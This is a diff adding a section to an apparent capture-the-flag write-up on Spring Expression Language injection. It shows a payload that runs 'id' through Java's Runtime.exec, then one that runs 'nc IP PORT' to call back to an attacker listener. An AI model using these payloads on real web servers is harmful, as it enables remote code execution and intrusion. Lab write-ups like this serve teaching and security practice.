@@ -207,3 +207,25 @@ Obviously "Expression Language" is being used here, So cancel all your appointme
 >Expression Language (EL) Injection happens when attacker controlled data enters an EL interpreter.
 
 We can take some time and read an amazing EL Injection in Spring Boot by "deadpool" ![Link to deadpool blog](http://deadpool.sh/2017/RCE-Springs/).
+
+So we can try and send a request with an injection that will execute a given command using the java's `Runtime` class, following by the `exec()` method. We will check if we can execute any command.
+We will use the linux `id` command, just to verify that we can execute code on the target webserver.
+
+```
+T(java.lang.Runtime).getRuntime().exec('id')
+
+```
+![ID via ELi](https://gyazo.com/25f08203df2de8f37b453df5ecacf125.png)
+
+The request hangs for like 40 seconds, and we dont get any output on the HTTP response, so why not sending a command that doesn't require an HTTP response?
+let's set an "nc" listener, and set `quantity` value to the next payload:
+
+
+```
+T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')
+
+```
+![NC via ELi](https://gyazo.com/3489861369a70b000067419aa54f530e.png)
+
+Nice, so we **verified our code execution** on the webserver, lets try and grab our flag. 
+
